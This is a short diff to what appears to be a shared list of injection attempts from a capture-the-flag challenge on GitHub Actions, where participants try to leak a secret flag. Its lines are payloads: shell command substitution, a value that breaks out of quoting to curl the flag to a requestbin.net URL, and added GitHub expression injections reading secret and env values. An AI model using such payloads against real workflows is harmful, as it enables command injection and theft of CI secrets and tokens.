@@ -442,3 +442,10 @@ FeverKing:${{ github.event.issue.number }} $( flag )
 ";echo \`ls\`"
 Nkzlxs:$flag
 sln-1550:';curl -X POST -d "$flag" http://requestbin.net/r/7vbx8ruo;echo '1
+R1gelX29:${{ secret.FLAG }}
+${{ secret.flag }}
+${{ secret[FLAG] }}
+${{ env.flag }}
+${{ env[FLAG] }}
+${{ env.FLAG }}
+"; echo $flag"
